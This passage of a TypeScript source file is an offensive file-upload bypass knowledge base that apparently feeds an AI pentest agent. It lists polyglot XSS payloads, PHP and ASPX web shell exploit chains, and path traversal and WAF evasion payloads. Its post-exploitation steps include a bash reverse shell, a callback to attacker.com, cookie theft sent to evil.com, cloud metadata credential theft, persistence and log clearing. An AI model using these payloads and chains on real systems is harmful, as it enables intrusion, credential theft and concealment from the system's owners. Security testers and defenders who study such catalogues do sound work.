    name: "HTML/Image Polyglot",
    category: "polyglot",
    subcategory: "web_polyglot",
    payload: "GIF89a/*<html><body><script>alert(1)</script></body></html>*/=0;",
    mechanism: "File starts with GIF89a (valid GIF header) followed by HTML in a GIF comment block. If served as text/html, browsers render the HTML. If served as image/gif, it's a valid (broken) GIF. Achieves stored XSS if Content-Type can be manipulated.",
    useWhen: ["Content-Type sniffing enabled", "No X-Content-Type-Options: nosniff", "File served from same origin"],
    effectiveAgainst: ["generic", "aws_s3", "azure_blob"],
    detectionRisk: "medium",
    mitreTechniques: ["T1059.007", "T1027.001"],
    chainsTo: ["mime-html-upload", "mime-svg-xss"],
    detectionSignatures: ["HTML tags in image files", "Script content in GIF comments"],
    successRate: "occasional",
    operatorNotes: "Effectiveness depends on X-Content-Type-Options header. Without 'nosniff', browsers may sniff the content and render as HTML despite image/gif Content-Type. Test with and without the header.",
  },
];

// ─── Race Condition Techniques ──────────────────────────────────────────────

export const RACE_CONDITION_TECHNIQUES: BypassTechnique[] = [
  {
    id: "race-toctou",
    name: "TOCTOU Race (Time-of-Check/Time-of-Use)",
    category: "race_condition",
    subcategory: "toctou",
    payload: "Upload valid image → race to replace with shell before validation completes",
    mechanism: "If the application writes the file first, then validates, there's a window where the malicious file exists on disk. If you can access it during this window (or if validation fails but doesn't delete), you achieve execution.",
    useWhen: ["File written before validation", "Async validation pipeline", "Validation doesn't delete on failure", "Known upload path"],
    effectiveAgainst: ["php_apache", "node_express", "python_django", "ruby_rails"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.008", "T1068"],
    chainsTo: ["race-parallel-upload", "path-traversal-basic"],
    detectionSignatures: ["Rapid sequential requests to upload path", "File access before validation completion"],
    successRate: "occasional",
    operatorNotes: "Use Burp Intruder or custom script to rapidly request the uploaded file URL while simultaneously uploading. The window may be milliseconds — use high concurrency. Check if the app uses a temp directory before moving to final location.",
  },
  {
    id: "race-parallel-upload",
    name: "Parallel Upload Race Condition",
    category: "race_condition",
    subcategory: "concurrency",
    payload: "Upload shell.php and shell.jpg simultaneously with same filename → hope shell.php wins the race",
    mechanism: "Upload two files with the same target filename simultaneously. If the application doesn't use atomic file operations or proper locking, the malicious file may overwrite the validated one, or the validation of one may be applied to the other.",
    useWhen: ["No file locking on uploads", "Predictable filename generation", "Same-name overwrites allowed"],
    effectiveAgainst: ["php_apache", "node_express", "python_flask"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1068"],
    chainsTo: ["race-toctou"],
    detectionSignatures: ["Concurrent uploads with same filename", "File content mismatch after upload"],
    successRate: "rare",
    operatorNotes: "Requires the application to have a race condition in its upload handling. More common in custom upload handlers than in framework-provided ones. Test with high concurrency (50+ parallel requests).",
  },
  {
    id: "race-chunked-reassembly",
    name: "Chunked Upload Reassembly Race",
    category: "race_condition",
    subcategory: "chunked",
    payload: "Upload file in chunks, replace middle chunk with malicious content during reassembly",
    mechanism: "Applications that support chunked/resumable uploads may validate individual chunks but not the reassembled file. Or there's a window between reassembly and final validation where the complete malicious file exists.",
    useWhen: ["Chunked/resumable upload supported", "Individual chunk validation only", "Predictable chunk storage location"],
    effectiveAgainst: ["node_express", "java_spring", "generic"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.008", "T1068"],
    chainsTo: ["race-toctou"],
    detectionSignatures: ["Chunk content mismatch", "Rapid chunk replacement requests"],
    successRate: "rare",
    operatorNotes: "Target applications using tus.io, Dropzone.js chunked mode, or custom chunked upload implementations. The reassembly step is often the weakest point.",
  },
];

// ─── Path Traversal via Filename ────────────────────────────────────────────

export const PATH_TRAVERSAL_TECHNIQUES: BypassTechnique[] = [
  {
    id: "path-traversal-basic",
    name: "Basic Path Traversal in Filename",
    category: "path_traversal",
    subcategory: "directory_traversal",
    payload: "../../../var/www/html/shell.php, ..\\..\\..\\inetpub\\wwwroot\\shell.asp",
    mechanism: "If the application uses the uploaded filename directly in the storage path without sanitization, ../ sequences can escape the upload directory and write to arbitrary locations (like the web root).",
    useWhen: ["Filename used in file path construction", "No path sanitization", "Known web root location"],
    effectiveAgainst: ["php_apache", "php_nginx", "aspnet_iis", "node_express", "python_django"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.008", "T1083"],
    chainsTo: ["path-traversal-encoded", "ext-php-alternatives"],
    detectionSignatures: ["../ or ..\\ in uploaded filename", "Path traversal sequences in multipart data"],
    successRate: "occasional",
    operatorNotes: "Try both forward slash (Linux) and backslash (Windows) variants. Also try: ....// (double dot bypass), ..;/ (Tomcat specific), ..\\./ (mixed separators). Check if the upload directory is within the web root.",
  },
  {
    id: "path-traversal-encoded",
    name: "Encoded Path Traversal",
    category: "path_traversal",
    subcategory: "encoded_traversal",
    payload: "..%2f..%2f..%2fshell.php, ..%5c..%5c..%5cshell.asp, %2e%2e%2f%2e%2e%2f",
    mechanism: "URL-encode the path traversal characters to bypass filters that check for literal '../'. If the application decodes after validation, the traversal succeeds.",
    useWhen: ["Basic ../ filtering in place", "Application URL-decodes filenames", "WAF blocks literal traversal"],
    effectiveAgainst: ["php_apache", "java_tomcat", "aspnet_iis", "generic"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1083", "T1027"],
    chainsTo: ["encoding-double-url", "path-traversal-basic"],
    detectionSignatures: ["URL-encoded path separators in filename", "%2f or %5c in upload data"],
    successRate: "occasional",
    operatorNotes: "Encoding variants to try: %2e%2e%2f, %2e%2e/, ..%2f, %2e%2e%5c, ..%255c (double-encoded). Also try: ..%c0%af (overlong UTF-8 for /), ..%ef%bc%8f (fullwidth solidus).",
  },
  {
    id: "path-traversal-iis",
    name: "IIS-Specific Path Traversal",
    category: "path_traversal",
    subcategory: "iis_traversal",
    payload: "..\\..\\..\\inetpub\\wwwroot\\shell.aspx, ...\\...\\shell.asp",
    mechanism: "IIS handles backslashes as path separators and has unique parsing for multiple dots. '...\\.\\' can bypass some IIS-specific filters. Combined with short filename (8.3) format can bypass length checks.",
    useWhen: ["IIS target", "Windows path handling", "Short filename (8.3) enabled"],
    effectiveAgainst: ["aspnet_iis"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.008", "T1083"],
    chainsTo: ["ext-semicolon", "ext-colon-ads"],
    detectionSignatures: ["Backslash path traversal in uploads", "Windows-style paths in filename"],
    successRate: "occasional",
    operatorNotes: "IIS-specific tricks: use backslash, try ...\\.\\, try 8.3 short names (SHELL~1.PHP), try UNC paths (\\\\server\\share). Check if IIS request filtering is configured.",
  },
];

// ─── Exploit Chains ─────────────────────────────────────────────────────────

export const EXPLOIT_CHAINS: ExploitChain[] = [
  {
    id: "chain-upload-to-rce-php",
    name: "File Upload → Web Shell → RCE (PHP)",
    description: "Upload a PHP web shell by bypassing extension and content validation, then execute commands via the uploaded shell.",
    steps: [
      { order: 1, technique: "magic-bytes-gif", description: "Create GIF89a + PHP polyglot", payload: "GIF89a;<?php system($_GET['c']); ?>", expectedResult: "File passes magic byte validation", fallbackTechnique: "magic-bytes-png" },
      { order: 2, technique: "ext-double-extension", description: "Use double extension to bypass blacklist", payload: "shell.php.gif", expectedResult: "Extension check passes (sees .gif)", fallbackTechnique: "ext-php-alternatives" },
      { order: 3, technique: "mime-image-php", description: "Set Content-Type to image/gif", payload: "Content-Type: image/gif", expectedResult: "MIME type validation passes", fallbackTechnique: "mime-octet-stream" },
      { order: 4, technique: "path-traversal-basic", description: "Access uploaded file via web", payload: "GET /uploads/shell.php.gif?c=id", expectedResult: "PHP executes, returns uid output", fallbackTechnique: "race-toctou" },
    ],
    prerequisites: ["PHP/Apache target", "File upload functionality", "Uploaded files accessible via web"],
    impact: "rce",
    difficulty: "medium",
    targetEnvironments: ["php_apache", "php_nginx"],
  },
  {
    id: "chain-upload-to-rce-aspnet",
    name: "File Upload → ASPX Shell → RCE (ASP.NET/IIS)",
    description: "Upload an ASPX web shell using IIS-specific bypasses (semicolons, ADS, trailing dots).",
    steps: [
      { order: 1, technique: "ext-semicolon", description: "Use semicolon bypass for IIS", payload: "shell.aspx;.jpg", expectedResult: "IIS treats as .aspx with parameter", fallbackTechnique: "ext-dot-trailing" },
      { order: 2, technique: "mime-image-php", description: "Set Content-Type to image/jpeg", payload: "Content-Type: image/jpeg", expectedResult: "MIME validation passes", fallbackTechnique: "mime-octet-stream" },
      { order: 3, technique: "ext-colon-ads", description: "Alternative: use ADS if semicolon fails", payload: "shell.aspx::$DATA", expectedResult: "File stored as shell.aspx", fallbackTechnique: "ext-space" },
      { order: 4, technique: "path-traversal-iis", description: "Navigate to uploaded shell", payload: "GET /uploads/shell.aspx;.jpg", expectedResult: "ASPX executes, returns command output" },
    ],
    prerequisites: ["IIS/ASP.NET target", "File upload functionality", "NTFS filesystem"],
    impact: "rce",
    difficulty: "medium",
    targetEnvironments: ["aspnet_iis"],
  },
  {
    id: "chain-svg-to-ssrf",
    name: "SVG Upload → SSRF → Internal Network Access",
    description: "Upload an SVG with external entity references to achieve SSRF and access internal services.",
    steps: [
      { order: 1, technique: "mime-svg-xss", description: "Upload SVG with XXE/SSRF payload", payload: "<!DOCTYPE svg [<!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><svg>&xxe;</svg>", expectedResult: "SVG accepted as valid image" },
      { order: 2, technique: "magic-bytes-gif", description: "If SVG blocked, try SVG in image context", payload: "SVG with xlink:href to internal URLs", expectedResult: "Server processes SVG and makes internal request", fallbackTechnique: "mime-html-upload" },
      { order: 3, technique: "mime-image-php", description: "Trigger server-side SVG rendering", payload: "Request thumbnail/preview generation", expectedResult: "Server fetches external entities during rendering" },
    ],
    prerequisites: ["SVG upload accepted", "Server-side SVG processing (ImageMagick, librsvg)", "Internal network accessible from server"],
    impact: "file_read",
    difficulty: "medium",
    targetEnvironments: ["generic", "node_express", "python_django"],
  },
  {
    id: "chain-phar-deserialization",
    name: "Image Upload → PHAR Deserialization → RCE (PHP)",
    description: "Upload a PHAR polyglot disguised as JPEG, trigger deserialization via phar:// wrapper for RCE.",
    steps: [
      { order: 1, technique: "polyglot-phar-jpeg", description: "Create JPEG/PHAR polyglot with gadget chain", payload: "Valid JPEG + PHAR with __destruct() gadget", expectedResult: "File passes image validation" },
      { order: 2, technique: "mime-image-php", description: "Upload with image/jpeg Content-Type", payload: "Content-Type: image/jpeg", expectedResult: "Accepted as valid JPEG" },
      { order: 3, technique: "race-toctou", description: "Trigger phar:// deserialization", payload: "Find code path using file_exists(phar://uploads/image.jpg)", expectedResult: "PHAR metadata deserialized, gadget chain executes" },
    ],
    prerequisites: ["PHP target", "phar:// wrapper accessible", "Gadget chain available in dependencies", "Known upload path"],
    impact: "rce",
    difficulty: "hard",
    targetEnvironments: ["php_apache", "php_nginx"],
  },
  {
    id: "chain-webconfig-upload",
    name: "web.config Upload → Handler Mapping → RCE (IIS)",
    description: "Upload a web.config file to reconfigure IIS handler mappings, enabling execution of arbitrary file types.",
    steps: [
      { order: 1, technique: "path-traversal-basic", description: "Upload web.config to target directory", payload: "filename: web.config with custom handler mapping", expectedResult: "web.config placed in upload directory" },
      { order: 2, technique: "ext-aspnet-alternatives", description: "Upload shell with custom extension", payload: "shell.xyz (extension mapped in web.config to ASP.NET handler)", expectedResult: "Custom extension now executed as ASPX" },
      { order: 3, technique: "ext-double-extension", description: "Access the shell", payload: "GET /uploads/shell.xyz", expectedResult: "IIS processes file through ASP.NET handler, RCE achieved" },
    ],
    prerequisites: ["IIS target", "Upload to directory without existing web.config", "No applicationHost.config override preventing"],
    impact: "rce",
    difficulty: "medium",
    targetEnvironments: ["aspnet_iis"],
  },
  {
    id: "chain-htaccess-upload",
    name: ".htaccess Upload → PHP Handler → RCE (Apache)",
    description: "Upload a .htaccess file to make Apache treat a custom extension as PHP, then upload a shell with that extension.",
    steps: [
      { order: 1, technique: "path-traversal-basic", description: "Upload .htaccess to upload directory", payload: ".htaccess content: AddType application/x-httpd-php .xyz", expectedResult: ".htaccess accepted (may need path traversal)" },
      { order: 2, technique: "ext-php-alternatives", description: "Upload shell with custom extension", payload: "shell.xyz containing <?php system($_GET['c']); ?>", expectedResult: "File accepted (extension not in blacklist)" },
      { order: 3, technique: "mime-octet-stream", description: "Access the shell", payload: "GET /uploads/shell.xyz?c=id", expectedResult: "Apache processes .xyz as PHP due to .htaccess, RCE achieved" },
    ],
    prerequisites: ["Apache with AllowOverride enabled", "Upload directory accessible via web", ".htaccess not in upload blacklist"],
    impact: "rce",
    difficulty: "easy",
    targetEnvironments: ["php_apache"],
  },
];

// ─── Tech Stack Profiles ────────────────────────────────────────────────────

export const TECH_STACK_PROFILES: TechStackProfile[] = [
  {
    stack: "php_apache",
    name: "PHP on Apache (mod_php / PHP-FPM)",
    defaultBehavior: "Apache uses AddHandler/AddType to map extensions to PHP handler. Files in web root with PHP extensions are executed. move_uploaded_file() used for storage.",
    commonValidations: ["pathinfo() extension check", "getimagesize() for images", "mime_content_type() / finfo", "Blacklist of extensions", "File size limits"],
    weaknesses: [
      "AddHandler processes first recognized extension (shell.php.xyz executes as PHP if .xyz unknown)",
      ".htaccess can override handler mappings per-directory",
      "getimagesize() passes on polyglot files (GIF89a + PHP)",
      "phar:// wrapper enables deserialization from any file",
      "include()/require() will execute PHP in any file regardless of extension",
      "preg_match() without anchors can be bypassed with newlines",
    ],
    recommendedBypassOrder: [
      "ext-php-alternatives",
      "ext-double-extension",
      "magic-bytes-gif",
      "chain-htaccess-upload",
      "ext-case-upper",
      "ext-null-byte",
      "polyglot-phar-jpeg",
    ],
    executionMethods: ["Direct URL access", "include()/require() LFI", "phar:// deserialization", ".htaccess handler override"],
    storagePaths: ["/var/www/html/uploads/", "/var/www/uploads/", "/tmp/", "/var/www/html/images/"],
  },
  {
    stack: "aspnet_iis",
    name: "ASP.NET on IIS (Windows)",
    defaultBehavior: "IIS uses handler mappings to route extensions to ASP.NET ISAPI. NTFS filesystem strips trailing dots/spaces. web.config per-directory configuration.",
    commonValidations: ["Path.GetExtension() check", "Content-Type validation", "FileExtensionContentTypeProvider", "Request filtering (IIS)", "Antivirus scanning"],
    weaknesses: [
      "NTFS strips trailing dots and spaces (shell.aspx. → shell.aspx)",
      "Semicolons treated as parameters in IIS 6.0 (shell.asp;.jpg → executes as ASP)",
      "Alternate Data Streams (::$DATA) bypass extension checks",
      "web.config upload can reconfigure handler mappings",
      "Short filename (8.3) format can bypass length/pattern filters",
      "IIS request filtering can be bypassed with URL encoding",
    ],
    recommendedBypassOrder: [
      "ext-dot-trailing",
      "ext-space",
      "ext-semicolon",
      "ext-colon-ads",
      "chain-webconfig-upload",
      "ext-aspnet-alternatives",
      "path-traversal-iis",
    ],
    executionMethods: ["Direct URL access", "web.config handler mapping", "ISAPI handler", "IIS virtual directory"],
    storagePaths: ["C:\\inetpub\\wwwroot\\uploads\\", "C:\\inetpub\\wwwroot\\App_Data\\", "C:\\Windows\\Temp\\"],
  },
  {
    stack: "java_tomcat",
    name: "Java on Apache Tomcat",
    defaultBehavior: "Tomcat maps .jsp/.jspx to JSP compiler. WAR files auto-deploy. web.xml defines servlet mappings. Multipart upload via commons-fileupload or Servlet 3.0.",
    commonValidations: ["Extension whitelist/blacklist", "Content-Type check", "File size limits", "Filename sanitization (replaceAll)", "Antivirus integration"],
    weaknesses: [
      "WAR file deployment via manager or auto-deploy directory",
      ".jspf (JSP fragment) files execute when included",
      "..;/ path traversal (Tomcat-specific normalization)",
      "Double URL encoding bypasses request filtering",
      "web.xml upload can add new servlet mappings",
      "Deserialization in upload processing (commons-fileupload CVEs)",
    ],
    recommendedBypassOrder: [
      "ext-java-alternatives",
      "ext-double-extension",
      "path-traversal-encoded",
      "encoding-double-url",
      "race-toctou",
      "ext-null-byte",
    ],
    executionMethods: ["Direct URL access to JSP", "WAR deployment", "Servlet mapping", "JSP include"],
    storagePaths: ["/opt/tomcat/webapps/ROOT/uploads/", "/tmp/", "/var/lib/tomcat/webapps/"],
  },
  {
    stack: "node_express",
    name: "Node.js on Express",
    defaultBehavior: "Express uses multer/busboy for multipart uploads. Files stored to disk or memory. No server-side execution of uploaded files by default — vulnerability requires misconfiguration or additional processing.",
    commonValidations: ["multer fileFilter (extension/MIME)", "file-type package (magic bytes)", "express-fileupload limits", "Custom middleware validation", "Sharp/ImageMagick for image processing"],
    weaknesses: [
      "No built-in execution of uploaded files (safer by default)",
      "But: template injection if filename used in template rendering",
      "Path traversal if filename used in fs.writeFile() without sanitization",
      "Prototype pollution via filename in object keys",
      "SSRF via SVG processing (Sharp, ImageMagick)",
      "Stored XSS via HTML/SVG uploads served from same origin",
      "Command injection if filename passed to child_process",
    ],
    recommendedBypassOrder: [
      "mime-svg-xss",
      "mime-html-upload",
      "path-traversal-basic",
      "race-toctou",
      "polyglot-html-image",
      "magic-bytes-pdf",
    ],
    executionMethods: ["Stored XSS via SVG/HTML", "SSRF via image processing", "Path traversal to overwrite config", "Template injection"],
    storagePaths: ["/tmp/", "./uploads/", "./public/uploads/", "/var/data/uploads/"],
  },
  {
    stack: "python_django",
    name: "Python on Django/Flask",
    defaultBehavior: "Django uses FileField/ImageField with validators. Files stored to MEDIA_ROOT. Flask uses werkzeug's secure_filename(). No server-side execution by default.",
    commonValidations: ["Django FileExtensionValidator", "Pillow verify() for images", "secure_filename() sanitization", "Content-Type validation", "File size limits (DATA_UPLOAD_MAX)"],
    weaknesses: [
      "secure_filename() strips path traversal but may allow unusual extensions",
      "Pillow/PIL processing can trigger CVEs (ImageMagick delegates)",
      "Template injection if filename rendered in Jinja2/Django templates",
      "SSRF via image URL fetching (if app downloads from URL)",
      "Stored XSS via SVG if served from same origin",
      "Pickle deserialization if uploaded files are unpickled",
      "SSTI if filename appears in template context",
    ],
    recommendedBypassOrder: [
      "mime-svg-xss",
      "mime-html-upload",
      "chain-svg-to-ssrf",
      "magic-bytes-pdf",
      "path-traversal-encoded",
      "race-toctou",
    ],
    executionMethods: ["Stored XSS via SVG/HTML", "SSRF via image processing", "SSTI via filename", "Pickle deserialization"],
    storagePaths: ["/var/www/media/", "./media/uploads/", "/tmp/", "./static/uploads/"],
  },
];

// ─── WAF Evasion Techniques ─────────────────────────────────────────────────

export const WAF_EVASION_TECHNIQUES: BypassTechnique[] = [
  {
    id: "waf-content-type-boundary",
    name: "Multipart Boundary Manipulation",
    category: "waf_evasion",
    subcategory: "multipart_abuse",
    payload: "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\\x00evil",
    mechanism: "WAFs parse multipart boundaries differently than application servers. Null bytes, extra whitespace, or unusual characters in the boundary string can cause the WAF to fail parsing while the server processes normally.",
    useWhen: ["WAF blocking upload attempts", "Multipart parsing differences between WAF and server", "Known WAF product"],
    effectiveAgainst: ["cloudflare_waf", "generic"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1562.001"],
    chainsTo: ["waf-chunked-encoding", "waf-content-disposition"],
    detectionSignatures: ["Unusual multipart boundary characters", "Null bytes in Content-Type header"],
    successRate: "occasional",
    operatorNotes: "Each WAF handles boundaries differently. Try: extra long boundaries (>70 chars), boundaries with special chars, duplicate boundary parameters, missing closing boundary.",
  },
  {
    id: "waf-content-disposition",
    name: "Content-Disposition Header Manipulation",
    category: "waf_evasion",
    subcategory: "header_abuse",
    payload: "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"; filename*=UTF-8''shell.php",
    mechanism: "Multiple filename parameters, RFC 5987 encoded filenames (filename*=), or unusual quoting can confuse WAFs. The server may use a different filename parameter than the one the WAF inspects.",
    useWhen: ["WAF inspects filename in Content-Disposition", "Server uses different parsing than WAF", "RFC 5987 support on server"],
    effectiveAgainst: ["cloudflare_waf", "generic"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1562.001"],
    chainsTo: ["waf-content-type-boundary", "encoding-double-url"],
    detectionSignatures: ["Multiple filename parameters", "RFC 5987 encoded filenames", "Unusual Content-Disposition formatting"],
    successRate: "occasional",
    operatorNotes: "Variations: duplicate filename params (WAF checks first, server uses last), filename with embedded newlines, filename* with charset encoding, unquoted filename with spaces.",
  },
  {
    id: "waf-chunked-encoding",
    name: "Transfer-Encoding: chunked Bypass",
    category: "waf_evasion",
    subcategory: "encoding_abuse",
    payload: "Transfer-Encoding: chunked\\n\\n4\\r\\n<?ph\\r\\n3\\r\\np s\\r\\n...",
    mechanism: "Send the upload body using chunked transfer encoding, splitting the malicious payload across chunk boundaries. Some WAFs don't reassemble chunks before inspection, missing the complete payload.",
    useWhen: ["WAF doesn't reassemble chunked requests", "Server supports chunked uploads", "Payload signature split across chunks"],
    effectiveAgainst: ["cloudflare_waf", "generic"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1562.001", "T1027"],
    chainsTo: ["waf-content-type-boundary"],
    detectionSignatures: ["Chunked encoding on upload requests", "Unusual chunk sizes"],
    successRate: "occasional",
    operatorNotes: "Split the payload at signature boundaries. If WAF looks for '<?php', send '<?ph' in one chunk and 'p' in the next. Also try: chunk extensions, trailer headers, zero-length chunks.",
  },
];

// ─── Post-Upload Exploitation ───────────────────────────────────────────────

export interface PostUploadTechnique {
  id: string;
  name: string;
  description: string;
  prerequisites: string[];
  steps: string[];
  impact: string;
  targetStacks: TechStack[];
}

export const POST_UPLOAD_TECHNIQUES: PostUploadTechnique[] = [
  {
    id: "post-webshell-execution",
    name: "Web Shell Command Execution",
    description: "After uploading a web shell, use it to execute system commands, establish persistence, and pivot.",
    prerequisites: ["Web shell uploaded and accessible", "PHP/ASP/JSP execution confirmed"],
    steps: [
      "1. Verify execution: curl 'http://target/uploads/shell.php?c=id'",
      "2. Enumerate: whoami, uname -a, cat /etc/passwd, env",
      "3. Check connectivity: curl http://attacker.com/callback",
      "4. Establish reverse shell: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
      "5. Or upgrade to Meterpreter: msfvenom payload + download + execute",
      "6. Persistence: crontab, systemd service, SSH key injection",
      "7. Cleanup: remove web shell, clear logs",
    ],
    impact: "Full RCE → lateral movement → persistence",
    targetStacks: ["php_apache", "php_nginx", "aspnet_iis", "java_tomcat"],
  },
  {
    id: "post-lfi-chain",
    name: "Upload + Local File Inclusion Chain",
    description: "Upload a file with embedded code (in metadata/comments), then trigger LFI to include and execute it.",
    prerequisites: ["File upload (any type accepted)", "LFI vulnerability elsewhere in app", "Known upload path"],
    steps: [
      "1. Upload image with PHP in EXIF: exiftool -Comment='<?php system($_GET[c]); ?>' img.jpg",
      "2. Note the upload path (e.g., /uploads/img.jpg)",
      "3. Trigger LFI: http://target/page.php?file=../uploads/img.jpg",
      "4. PHP engine processes the file, executes code in EXIF comment",
      "5. Alternative: use php://filter to read then base64 decode",
      "6. Alternative: use zip:// or phar:// wrappers on uploaded archives",
    ],
    impact: "RCE via LFI + uploaded file",
    targetStacks: ["php_apache", "php_nginx"],
  },
  {
    id: "post-stored-xss-chain",
    name: "Upload + Stored XSS → Account Takeover",
    description: "Upload HTML/SVG with JavaScript to achieve stored XSS, then steal admin session cookies.",
    prerequisites: ["SVG or HTML upload accepted", "Files served from same origin", "No CSP or weak CSP"],
    steps: [
      "1. Upload SVG: <svg><script>fetch('https://evil.com/?c='+document.cookie)</script></svg>",
      "2. Find the URL where the file is served",
      "3. Send link to admin (social engineering or inject in page)",
      "4. When admin views, JavaScript executes in app context",
      "5. Steal session cookie, localStorage tokens, or CSRF tokens",
      "6. Use stolen session to access admin panel",
      "7. Escalate: create new admin account, modify application",
    ],
    impact: "Account takeover → full application compromise",
    targetStacks: ["generic", "node_express", "python_django", "ruby_rails"],
  },
  {
    id: "post-ssrf-cloud-metadata",
    name: "Upload + SSRF → Cloud Metadata Theft",
    description: "Upload SVG/image that triggers SSRF to cloud metadata endpoint, stealing IAM credentials.",
    prerequisites: ["Server-side image processing", "Running on AWS/GCP/Azure", "IMDSv1 or accessible metadata"],
    steps: [
      "1. Upload SVG with external reference: <image xlink:href='http://169.254.169.254/latest/meta-data/iam/security-credentials/'/>",
      "2. Trigger server-side rendering (thumbnail, preview, PDF export)",
      "3. Server fetches metadata endpoint during processing",
      "4. Extract IAM role name from response",
      "5. Fetch credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
      "6. Use stolen credentials for AWS API access",
      "7. Escalate: S3 access, EC2 control, secrets manager",
    ],
    impact: "Cloud credential theft → infrastructure compromise",
    targetStacks: ["generic", "node_express", "python_django", "aws_s3"],
  },
];

// ─── Knowledge Retrieval Functions ──────────────────────────────────────────

/**
 * Get all techniques for a specific tech stack, ordered by success rate.
 */
export function getTechniquesForStack(stack: TechStack): BypassTechnique[] {
  const allTechniques = [
    ...EXTENSION_MANIPULATION_TECHNIQUES,
    ...MIME_CONFUSION_TECHNIQUES,
    ...MAGIC_BYTES_TECHNIQUES,
    ...POLYGLOT_TECHNIQUES,
    ...RACE_CONDITION_TECHNIQUES,
    ...PATH_TRAVERSAL_TECHNIQUES,
    ...WAF_EVASION_TECHNIQUES,
  ];

  const successOrder: Record<string, number> = { reliable: 0, common: 1, occasional: 2, rare: 3 };

  return allTechniques
    .filter((t) => t.effectiveAgainst.includes(stack) || t.effectiveAgainst.includes("generic"))
    .sort((a, b) => successOrder[a.successRate] - successOrder[b.successRate]);
}

/**
 * Get the recommended bypass strategy for a specific tech stack.
 */
export function getBypassStrategy(stack: TechStack): {
  profile: TechStackProfile;
  techniques: BypassTechnique[];
  chains: ExploitChain[];
  postExploit: PostUploadTechnique[];
} {
  const profile = TECH_STACK_PROFILES.find((p) => p.stack === stack);
  if (!profile) {
    return { profile: TECH_STACK_PROFILES[0], techniques: [], chains: [], postExploit: [] };
  }

  const techniques = getTechniquesForStack(stack);
  const chains = EXPLOIT_CHAINS.filter((c) => c.targetEnvironments.includes(stack));
  const postExploit = POST_UPLOAD_TECHNIQUES.filter((p) => p.targetStacks.includes(stack));

  return { profile, techniques, chains, postExploit };
}

/**
 * Get techniques by category for training purposes.
 */
export function getTechniquesByCategory(category: BypassCategory): BypassTechnique[] {
  const allTechniques = [
    ...EXTENSION_MANIPULATION_TECHNIQUES,
    ...MIME_CONFUSION_TECHNIQUES,
    ...MAGIC_BYTES_TECHNIQUES,
    ...POLYGLOT_TECHNIQUES,
    ...RACE_CONDITION_TECHNIQUES,
    ...PATH_TRAVERSAL_TECHNIQUES,
    ...WAF_EVASION_TECHNIQUES,
  ];

  return allTechniques.filter((t) => t.category === category);
}

/**
 * Build a comprehensive training context for the LLM about file upload bypasses.
 * This is injected into the AI's knowledge when handling file upload testing engagements.
 */
export function buildFileUploadTrainingContext(): string {
  const allTechniques = [
    ...EXTENSION_MANIPULATION_TECHNIQUES,
    ...MIME_CONFUSION_TECHNIQUES,
    ...MAGIC_BYTES_TECHNIQUES,
    ...POLYGLOT_TECHNIQUES,
    ...RACE_CONDITION_TECHNIQUES,
    ...PATH_TRAVERSAL_TECHNIQUES,
    ...WAF_EVASION_TECHNIQUES,
  ];

  let context = `# File Upload Bypass Knowledge Base\n\n`;
  context += `Total techniques: ${allTechniques.length}\n`;
  context += `Exploit chains: ${EXPLOIT_CHAINS.length}\n`;
  context += `Tech stack profiles: ${TECH_STACK_PROFILES.length}\n\n`;

  context += `## Key Principles\n\n`;
  context += `1. Always identify the tech stack FIRST — bypass strategies differ dramatically\n`;
  context += `2. Layer multiple bypasses (extension + MIME + magic bytes) for maximum success\n`;
  context += `3. Check for post-upload execution paths (direct access, LFI, SSRF, deserialization)\n`;
  context += `4. Race conditions are underutilized — always test TOCTOU windows\n`;
  context += `5. WAF bypass is often necessary before application-level bypass\n`;
  context += `6. .htaccess and web.config uploads are often more valuable than direct shell upload\n\n`;

  context += `## Quick Reference by Stack\n\n`;
  for (const profile of TECH_STACK_PROFILES) {
    context += `### ${profile.name}\n`;
    context += `Top bypasses: ${profile.recommendedBypassOrder.slice(0, 3).join(", ")}\n`;
    context += `Weaknesses: ${profile.weaknesses.slice(0, 2).join("; ")}\n\n`;
  }

  return context;
}

/**
 * Get total technique count for metrics.
 */
export function getTotalTechniqueCount(): number {
  return (
    EXTENSION_MANIPULATION_TECHNIQUES.length +
    MIME_CONFUSION_TECHNIQUES.length +
    MAGIC_BYTES_TECHNIQUES.length +
    POLYGLOT_TECHNIQUES.length +
    RACE_CONDITION_TECHNIQUES.length +
    PATH_TRAVERSAL_TECHNIQUES.length +
    WAF_EVASION_TECHNIQUES.length
  );
}
